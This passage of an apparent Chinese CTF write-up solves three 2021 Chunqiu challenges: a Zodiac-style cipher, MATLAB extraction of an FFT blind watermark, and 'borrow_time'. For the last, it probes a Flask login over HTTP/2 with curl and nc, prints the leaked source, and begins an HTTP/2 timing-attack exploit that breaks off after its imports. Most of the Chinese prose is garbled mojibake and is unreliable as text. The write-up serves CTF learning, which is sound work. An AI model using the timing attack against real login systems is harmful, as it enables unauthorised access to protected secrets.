èƒ½è§£å‡ºå¯†æ–‡ï¼Œä¸ç„¶æˆ‘å°±ä¼šç»§ç»­çŠ¯ç½ª:)</p><p>æœ¬é¢˜è·å–flagæäº¤å‰è¯·åŠ ä¸Šflag{}</p></blockquote><p><img src="/2021/02/03/CTF_2021chunqiu/Twelve_palaces_of_serial_killers.png" alt="Twelve_palaces_of_serial_killers"></p><p>é¦–å…ˆæŠ„äº†ä¸€ä»½ã€‚ã€‚</p><pre class="language-none"><code class="language-none">^#@$@#()/&gt;@?==%1(!)&gt;(*+3&lt;#86@-7$^.4&amp;)8%#5&amp;6!=%1#$-$+5&amp;?#!.03!%=@=1010?(*~#??.+)%&amp;.7^8=1%*^=$5$7@@8&gt;&amp;*99@0185(+7)&lt;%3#@^4&amp;@@&lt;.)$3*#%%&lt;&lt;*++.@.?=~**+!==65^@&amp;</code></pre><p>æŸ¥äº†ä¸€ä¸‹ <strong>é»„é“åäºŒå®«æ€æ‰‹</strong>ï¼Œå¯ä»¥çœ‹åˆ°å»å¹´12æœˆå¯†ç ä¿¡340 è¢«ç ´è§£çš„æ–°é—»ã€‚</p><p>å½“ç„¶è¿˜æœ‰è§£å¯†çš„è§†é¢‘ï¼Œ<a href="https://www.youtube.com/watch?v=-1oQLPRE21o">Letâ€™s Crack Zodiac - Episode 5 - The 340 Is Solved!ï¼ˆYoutubeï¼‰</a></p><p>æˆ–è€… <a href="https://www.bilibili.com/video/BV1Ra411F7tv">é»„é“åäºŒå®«æ€æ‰‹çš„å¯†ç ä¿¡ã€Œ340ã€æ˜¯æ€ä¹ˆè¢«ç ´è§£çš„ ï¼ˆBç«™æ¬è¿ï¼ŒåŒä¸Šï¼‰</a> </p><p>å†æˆ–è€… <a href="https://www.bilibili.com/video/BV1nX4y1u7Eo/">é»„é“åäºŒå®«è¿ç¯æ€æ‰‹å¯†ç ç ´è¯‘å…¨è¿‡ç¨‹ï¼ˆBç«™æ¬è¿ï¼Œå¸¦ç¿»è¯‘ï¼‰</a></p><p>æŒ‰ç…§è§†é¢‘é‡Œçš„è§£å¯†æ–¹æ³•ï¼Œä¾æ¬¡é”™ä½å¾€ä¸‹è¯»å–å¾—åˆ°ä»¥ä¸‹å­—ç¬¦ã€‚</p><p><em>ï¼ˆæ‰‹è§£çš„å¥½ç´¯ï¼Œå¯»æ€ç€è¿˜ä¸å¦‚å†™ä¸ªè„šæœ¬ï¼Œåšä¸ªå¾ªç¯å†å–ä¸ªæ¨¡å°±å¥½äº†å–µ</em></p><p><img src="/2021/02/03/CTF_2021chunqiu/image-20210129204501719.png"></p><pre class="language-none"><code class="language-none">^&gt;%..@3*&amp;#(#0+@#+.@*53)8@+@$+&amp;!%&gt;^&amp;.@36%&amp;&amp;4@?#&lt;!=.*9@=(#=@79@&lt;~)8%=^=0.*/611811)*&gt;@#00%8$+@-$1?*53!?7-+(^(*==$$5*=+#==^4&amp;~$7%6%.&amp;?#5)%51!)#?$&lt;&lt;^()8!?7%&lt;@</code></pre><p>å†ä¸¢åˆ° <a href="https://www.majorgeeks.com/files/details/azdecrypt.html">AZdecrypt è¿™ä¸ªè½¯ä»¶</a> é‡Œå»è§£å¯†ï¼Œå‡ ç§’é’Ÿå°±å‡ºæ¥äº†ã€‚</p><p><img src="/2021/02/03/CTF_2021chunqiu/image-20210129204542866.png" alt="flag"></p><p>è‰ï¼Œè¿™å°±æ˜¯ flag å•Šï¼</p><pre class="language-none"><code class="language-none">IKILLED A LOT OF PEOPLE AND THE PEOPLE I KILLED WILL BECOME SLAVES TO SERVE ME THIS IS FLAG WUUHUU TAKE OFF I HOPE YOU CAN DECRYPT IT AS SOON AS POSSIBLE OR I WILL CONTINUE TO COMMIT THE CRIME</code></pre><p>æœ€åå‘ç°æäº¤çš„æ—¶å€™è¦è¿èµ·æ¥ã€‚</p><p><code>flag{WUUHUUTAKEOFF}</code></p><h2 id="snowww"><a href="#snowww" class="headerlink" title="snowww"></a>snowww</h2><blockquote><p>Itâ€™s really cold this winter, can you find what is hidden in snow</p></blockquote><p><img src="/2021/02/03/CTF_2021chunqiu/snow.jpg" alt="snow"></p><p>å°¾éƒ¨æ‹¼æ¥äº†ä¸€ä¸ª rarï¼Œæå–å‡ºæ¥ï¼Œå¾—åˆ° MATLAB æºä»£ç å’Œæ•°æ®ã€‚</p><p><img src="/2021/02/03/CTF_2021chunqiu/image-20210130170624987.png" alt="rar"></p><p><code>encode.m</code>:</p><pre class="language-matlab" data-language="matlab"><code class="language-matlab"><span class="token comment">%% Run on Matlab2012b </span>clc<span class="token punctuation">;</span>clear<span class="token punctuation">;</span>close all<span class="token punctuation">;</span>alpha <span class="token operator">=</span> <span class="token number">80</span><span class="token punctuation">;</span>im <span class="token operator">=</span> <span class="token function">double</span><span class="token punctuation">(</span><span class="token function">imread</span><span class="token punctuation">(</span><span class="token string">'original.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">255</span><span class="token punctuation">;</span>mark <span class="token operator">=</span> <span class="token function">double</span><span class="token punctuation">(</span><span class="token function">imread</span><span class="token punctuation">(</span><span class="token string">'watermark.png'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">255</span><span class="token punctuation">;</span>imsize <span class="token operator">=</span> <span class="token function">size</span><span class="token punctuation">(</span>im<span class="token punctuation">)</span><span class="token punctuation">;</span>TH<span class="token operator">=</span><span class="token function">zeros</span><span class="token punctuation">(</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0.5</span><span class="token punctuation">,</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>TH1 <span class="token operator">=</span> TH<span class="token punctuation">;</span><span class="token function">TH1</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">size</span><span class="token punctuation">(</span>mark<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">size</span><span class="token punctuation">(</span>mark<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span> <span class="token operator">=</span> mark<span class="token punctuation">;</span>M<span class="token operator">=</span><span class="token function">randperm</span><span class="token punctuation">(</span><span class="token number">0.5</span><span class="token operator">*</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>N<span class="token operator">=</span><span class="token function">randperm</span><span class="token punctuation">(</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token string">'encode.mat'</span><span class="token punctuation">,</span><span class="token string">'M'</span><span class="token punctuation">,</span><span class="token string">'N'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0.5</span>    <span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>         <span class="token function">TH</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">TH1</span><span class="token punctuation">(</span><span class="token function">M</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">N</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">end</span><span class="token keyword">end</span>mark_ <span class="token operator">=</span> <span class="token function">zeros</span><span class="token punctuation">(</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mark_</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0.5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token operator">=</span>TH<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0.5</span>    <span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>        <span class="token function">mark_</span><span class="token punctuation">(</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">j</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">TH</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">end</span><span class="token keyword">end</span>FA<span class="token operator">=</span><span class="token function">fft2</span><span class="token punctuation">(</span>im<span class="token punctuation">)</span><span class="token punctuation">;</span>FB<span class="token operator">=</span>FA<span class="token operator">+</span>alpha<span class="token operator">*</span><span class="token function">double</span><span class="token punctuation">(</span>mark_<span class="token punctuation">)</span><span class="token punctuation">;</span>FAO<span class="token operator">=</span><span class="token function">ifft2</span><span class="token punctuation">(</span>FB<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">imwrite</span><span class="token punctuation">(</span>FAO<span class="token punctuation">,</span><span class="token string">'snow.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>å™¢ï¼Œæ˜¯é¢‘åŸŸéšå†™äº†ç›²æ°´å°å•Šã€‚</p><p>å¯ä»¥çœ‹åˆ°æœ€åè¿›è¡Œäº† FFT å¤„ç†ï¼Œ<code>M, N</code> æ•°æ®ä¹Ÿéƒ½ç»™äº†ï¼Œç„¶åé€†å›å»å†™è„šæœ¬å°±å¥½äº†ã€‚</p><p>å¦å¤–æ³¨æ„åˆ° <code>mark_</code> ç¬¬ä¸€ç»´çš„å‰åŠéƒ¨åˆ†å’ŒååŠéƒ¨åˆ†æ˜¯å†—ä½™çš„ï¼Œéšä¾¿å–ä¸€éƒ¨åˆ†å°±å¥½äº†ã€‚</p><p><strong>Payload:</strong></p><pre class="language-matlab" data-language="matlab"><code class="language-matlab"><span class="token comment">% Author: MiaoTony</span><span class="token comment">% Blog: https://miaotony.xyz</span>clc<span class="token punctuation">;</span>clear<span class="token punctuation">;</span>close all<span class="token punctuation">;</span>alpha <span class="token operator">=</span> <span class="token number">80</span><span class="token punctuation">;</span>im <span class="token operator">=</span> <span class="token function">double</span><span class="token punctuation">(</span><span class="token function">imread</span><span class="token punctuation">(</span><span class="token string">'original.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">255</span><span class="token punctuation">;</span>snow <span class="token operator">=</span> <span class="token function">double</span><span class="token punctuation">(</span><span class="token function">imread</span><span class="token punctuation">(</span><span class="token string">'00000000.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">255</span><span class="token punctuation">;</span>imsize <span class="token operator">=</span> <span class="token function">size</span><span class="token punctuation">(</span>im<span class="token punctuation">)</span><span class="token punctuation">;</span>FA<span class="token operator">=</span><span class="token function">fft2</span><span class="token punctuation">(</span>im<span class="token punctuation">)</span><span class="token punctuation">;</span>FC<span class="token operator">=</span><span class="token function">fft2</span><span class="token punctuation">(</span>snow<span class="token punctuation">)</span><span class="token punctuation">;</span>mark_ <span class="token operator">=</span> <span class="token function">real</span><span class="token punctuation">(</span><span class="token punctuation">(</span>FC<span class="token operator">-</span>FA<span class="token punctuation">)</span><span class="token operator">/</span>alpha<span class="token punctuation">)</span><span class="token punctuation">;</span>TH <span class="token operator">=</span> <span class="token function">mark_</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0.5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span>TH1<span class="token operator">=</span><span class="token function">zeros</span><span class="token punctuation">(</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0.5</span><span class="token punctuation">,</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">load</span><span class="token punctuation">(</span><span class="token string">'encode.mat'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0.5</span>    <span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>         <span class="token function">TH1</span><span class="token punctuation">(</span><span class="token function">M</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">N</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">TH</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">end</span><span class="token keyword">end</span><span class="token function">imshow</span><span class="token punctuation">(</span>TH1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">imwrite</span><span class="token punctuation">(</span>TH1<span class="token punctuation">,</span><span class="token string">'mark.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>å¾—åˆ° mark å›¾ç‰‡ï¼Œå›¾ç‰‡æœ‰ç‚¹é»‘ï¼Œä½† flag æŒºæ¸…æ¥šäº†ï¼Œé—®é¢˜ä¸å¤§ã€‚</p><p><img src="/2021/02/03/CTF_2021chunqiu/mark.jpg" alt="mark"></p><p><code>flag{c93fd2a3-103f-4539-9a51-ad5a6437daa1}</code></p><blockquote><p>å™¢ï¼ŒåŸæ¥ Bä¹ä¸Šæœ‰æ–‡ç« ä»‹ç»å•Š emmm è¿˜æ˜¯2016å¹´çš„äº‹äº†ã€‚</p><p><a href="https://www.zhihu.com/question/50735753">é˜¿é‡Œå·´å·´å…¬å¸æ ¹æ®æˆªå›¾æŸ¥åˆ°æ³„éœ²ä¿¡æ¯çš„å…·ä½“å‘˜å·¥çš„æŠ€æœ¯æ˜¯ä»€ä¹ˆï¼Ÿ</a></p></blockquote><h2 id="borrow-time"><a href="#borrow-time" class="headerlink" title="borrow_time"></a>borrow_time</h2><blockquote><p>I wanna borrow some time.</p><p>[æ³¨ï¼šæƒ³æ³•å­è®¿é—®åˆ°é¢˜ç›®ï¼ŒåŠ æ²¹ã€‚æœ¬é¢˜æ¯éš”30åˆ†é’Ÿè‡ªåŠ¨é‡ç½®ã€‚]</p><p><a href="http://8.140.110.118/">http://8.140.110.118/</a></p></blockquote><p>ç›´æ¥è®¿é—®å¾—åˆ°çš„æ˜¯ä¸€ä¸² bit æµï¼Œemmm ä»€ä¹ˆç©æ„ã€‚</p><p>ç„¶åç”¨ curlï¼Œå‘ç°è®©æˆ‘ç”¨ HTTP0.9???</p><p>è®¿é—®å¾—åˆ°ä¸‹é¢çš„ï¼Œå°±æ˜¯é‚£ä¸² bit æµã€‚</p><p><img src="/2021/02/03/CTF_2021chunqiu/image-20210201011526465.png" alt="HTTP0.9"></p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">nc</span> <span class="token number">8.140</span>.110.118 <span class="token number">80</span> <span class="token operator">|</span> hexdump -Cmiaotony.xyz00000000  00 00 <span class="token number">12</span> 04 00 00 00 00  00 00 03 00 00 00 <span class="token number">80</span> 00  <span class="token operator">|</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token operator">|</span>00000010  04 00 01 00 00 00 05 00  ff ff ff 00 00 04 08 00  <span class="token operator">|</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token operator">|</span></code></pre><p>è¯•äº†ä¸€ä¸‹å‘ç°è¿™ä¸ªæ˜¯ HTTP2ï¼Œä½†æ˜¯æµè§ˆå™¨ä¸€èˆ¬éƒ½æ˜¯ä» HTTP1.1 <strong>åå•†å‡çº§</strong>åˆ° HTTP2 çš„è€Œä¸æ˜¯<strong>ç›´æ¥è¯·æ±‚ HTTP2</strong>çš„ï¼Œäºæ˜¯å°±è®¿é—®ä¸åˆ°äº†ã€‚</p><p>å…·ä½“å¯ä»¥çœ‹ä¸‹é¢çš„å¯¹æ¯”ã€‚</p><p><img src="/2021/02/03/CTF_2021chunqiu/image-20210201011325739.png" alt="HTTP2"></p><p><img src="/2021/02/03/CTF_2021chunqiu/image-20210201011359186.png" alt="--http2-prior-knowledge"></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># curl --http2-prior-knowledge http://8.140.110.118/ -v</span>*   Trying <span class="token number">8.140</span>.110.118:80<span class="token punctuation">..</span>.* Connected to <span class="token number">8.140</span>.110.118 <span class="token punctuation">(</span><span class="token number">8.140</span>.110.118<span class="token punctuation">)</span> port <span class="token number">80</span> <span class="token punctuation">(</span><span class="token comment">#0)</span>* Using HTTP2, server supports multi-use* Connection state changed <span class="token punctuation">(</span>HTTP/2 confirmed<span class="token punctuation">)</span>* Copying HTTP/2 data <span class="token keyword">in</span> stream buffer to connection buffer after upgrade: <span class="token assign-left variable">len</span><span class="token operator">=</span><span class="token number">0</span>* Using Stream ID: <span class="token number">1</span> <span class="token punctuation">(</span>easy handle 0x2795195f000<span class="token punctuation">)</span><span class="token operator">&gt;</span> GET / HTTP/2<span class="token operator">&gt;</span> Host: <span class="token number">8.140</span>.110.118<span class="token operator">&gt;</span> user-agent: curl/7.73.0<span class="token operator">&gt;</span> accept: */*<span class="token operator">&gt;</span>* Connection state changed <span class="token punctuation">(</span>MAX_CONCURRENT_STREAMS <span class="token operator">==</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token operator">!</span><span class="token operator">&lt;</span> HTTP/2 <span class="token number">200</span><span class="token operator">&lt;</span> server: nginx/1.17.10<span class="token operator">&lt;</span> date: Sat, <span class="token number">30</span> Jan <span class="token number">2021</span> <span class="token number">11</span>:29:47 GMT<span class="token operator">&lt;</span> content-type: text/html<span class="token punctuation">;</span> <span class="token assign-left variable">charset</span><span class="token operator">=</span>utf-8<span class="token operator">&lt;</span> content-length: <span class="token number">505</span><span class="token operator">&lt;</span>ï»¿<span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html<span class="token operator">&gt;</span><span class="token operator">&lt;</span>html <span class="token assign-left variable">lang</span><span class="token operator">=</span><span class="token string">"en"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>head<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>meta <span class="token assign-left variable">charset</span><span class="token operator">=</span><span class="token string">"UTF-8"</span><span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>title<span class="token operator">&gt;</span>Login<span class="token operator">&lt;</span>/title<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>link <span class="token assign-left variable">rel</span><span class="token operator">=</span><span class="token string">"stylesheet"</span> <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">"text/css"</span> <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">"/static/login.css"</span>/<span class="token operator">&gt;</span><span class="token operator">&lt;</span>/head<span class="token operator">&gt;</span><span class="token operator">&lt;</span>body<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>div <span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token string">"login"</span><span class="token operator">&gt;</span>        <span class="token operator">&lt;</span>h<span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span>Login<span class="token operator">&lt;</span>/h<span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span>        <span class="token operator">&lt;</span>form <span class="token assign-left variable">method</span><span class="token operator">=</span><span class="token string">"post"</span><span class="token operator">&gt;</span>            <span class="token operator">&lt;</span>input <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">"password"</span> <span class="token assign-left variable">required</span><span class="token operator">=</span><span class="token string">"required"</span> <span class="token assign-left variable">placeholder</span><span class="token operator">=</span><span class="token string">"å£ä»¤"</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"secret"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>/input<span class="token operator">&gt;</span>            <span class="token operator">&lt;</span>button <span class="token assign-left variable">class</span><span class="token operator">=</span><span class="token string">"but"</span> <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">"submit"</span><span class="token operator">&gt;</span>ç™»å½•<span class="token operator">&lt;</span>/button<span class="token operator">&gt;</span>        <span class="token operator">&lt;</span>/form<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>/div<span class="token operator">&gt;</span><span class="token operator">&lt;</span>/body<span class="token operator">&gt;</span><span class="token operator">&lt;</span>/html<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">!</span>-- /src --<span class="token operator">&gt;</span>* Connection <span class="token comment">#0 to host 8.140.110.118 left intact</span></code></pre><p>è®¿é—® <code>/src</code> å¾—åˆ°æºç ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token keyword">import</span> os<span class="token keyword">import</span> time<span class="token keyword">import</span> hashlib<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> requestapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>FLAG <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">[</span><span class="token string">"ICQ_FLAG"</span><span class="token punctuation">]</span>SECRET <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span>FLAG<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">]</span>SLEEP_TIME <span class="token operator">=</span> <span class="token number">10</span> <span class="token operator">**</span> <span class="token operator">-</span><span class="token number">10</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        secret <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'secret'</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>SECRET<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"^_^"</span>        <span class="token keyword">for</span> a<span class="token punctuation">,</span> b <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>secret<span class="token punctuation">,</span> SECRET<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> a <span class="token operator">==</span> <span class="token string">"*"</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>            <span class="token keyword">elif</span> a <span class="token operator">!=</span> b<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">"INCORRECT"</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>SLEEP_TIME<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"*"</span> <span class="token keyword">in</span> secret<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"INCORRECT"</span>        <span class="token keyword">return</span> FLAG<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/src"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">src</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        <span class="token keyword">return</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>äºæ˜¯å°±æ˜¯<strong>åŸºäºæ—¶é—´çš„ç›²æ³¨</strong>äº†å§ï¼Œæ¯ä¸€ä½çš„å­—ç¬¦å¯ä»¥å•ç‹¬è¿›è¡Œéå†ï¼Œæ­£åˆé¢˜æ„ borrow timeã€‚</p><p>ç„¶åå‘ç°äº†ç±»ä¼¼çš„é¢˜ç›®ï¼Œå°±æ˜¯ WCTF 2020 ä¸€é“é¢˜ç›®æ”¹çš„ã€‚</p><p>å‚è€ƒï¼š</p><p><a href="https://github.com/ConnorNelson/spaceless-spacing">https://github.com/ConnorNelson/spaceless-spacing</a></p><p><a href="https://github.com/DistriNet/timeless-timing-attacks">https://github.com/DistriNet/timeless-timing-attacks</a></p><p>è¿™é“é¢˜æŠŠ GET æ”¹æˆ POST äº†ï¼Œè·³è¿‡çš„å­—ç¬¦ç”± <code> </code>ï¼ˆç©ºæ ¼ï¼‰æ”¹æˆäº† <code>*</code>ï¼Œéœ€è¦æ”¹ä¸€ä¸‹ exploitã€‚</p><p>è¿™ä¸ª <code>TIMING_ITERATIONS</code>ï¼Œ<code>NUM_REQUEST_PAIRS</code> éœ€è¦æ”¹å¤§ä¸€ç‚¹ï¼Œä¸ç„¶ä¸¤ä¸ªè¯·æ±‚åŒæ—¶å‘å‡ºå»æ²¡å•¥åŒºåˆ«â€¦â€¦</p><p>ä»¥åŠ <code>http://8.140.110.118:80</code> è¦æŠŠç«¯å£ç»™æŒ‡å®šå¥½ï¼Œé€šè¿‡å®¡è®¡æºç å‘ç° <code>H2Request</code> å’Œ <code>HTTP20Connection</code> é‡Œé¢æ¥å£å°è£…çš„ä¸ä¸€æ ·ï¼Œä¼šæœ‰ç‚¹é—®é¢˜ï¼Œæˆ–è€…ä¼ ä¸ª <code>port</code> å‚æ•°è¿›å»ä¹Ÿå¯ã€‚</p><p><strong>Payload:</strong> <em>(h2time å‚è€ƒä¸Šé¢çš„ repo)</em></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> asyncio<span class="token keyword">import</span> time<span class="token keyword">import</span> string<span class="token 